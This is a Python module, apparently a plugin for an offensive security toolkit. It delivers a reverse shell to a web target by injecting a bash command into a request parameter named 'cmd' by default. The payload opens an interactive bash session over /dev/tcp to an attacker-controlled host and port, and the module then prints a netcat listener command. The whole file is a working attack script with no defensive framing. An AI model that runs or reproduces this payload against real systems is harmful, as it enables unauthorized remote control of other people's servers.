def run(data, cred, args):

    import requests

    from core.attacker import resolve_lhost

    url = args.extra[0]

    method = (
        getattr(args, "method", None)
        or "GET"
    ).upper()

    param = (
        getattr(args, "param", None)
        or "cmd"
    )

    lhost = resolve_lhost(args)

    if not lhost:
        print("[!] Failed to resolve LHOST")
        return data

    lport = int(
        getattr(args, "lport", None)
        or 4444
    )

    payload = (
        f"bash -c "
        f"'bash -i >& "
        f"/dev/tcp/{lhost}/{lport} "
        f"0>&1' &"
    )

    print("\n[*] Reverse Shell")
    print(f"  URL:     {url}")
    print(f"  LHOST:   {lhost}")
    print(f"  LPORT:   {lport}")
    print(f"  PARAM:   {param}")
    print()

    try:

        if method == "POST":

            requests.post(
                url,
                data={param: payload},
                timeout=5
            )

        else:

            requests.get(
                url,
                params={param: payload},
                timeout=5
            )

        print("[+] Payload delivered")
        print(f"[*] Listener: nc -lvnp {lport}")

    except requests.exceptions.ReadTimeout:

        print("[+] Payload sent")
        print("[*] Target stopped responding")
        print("[*] This is often normal for reverse shells")

    except Exception as e:

        print(f"[!] Error: {e}")

    return data
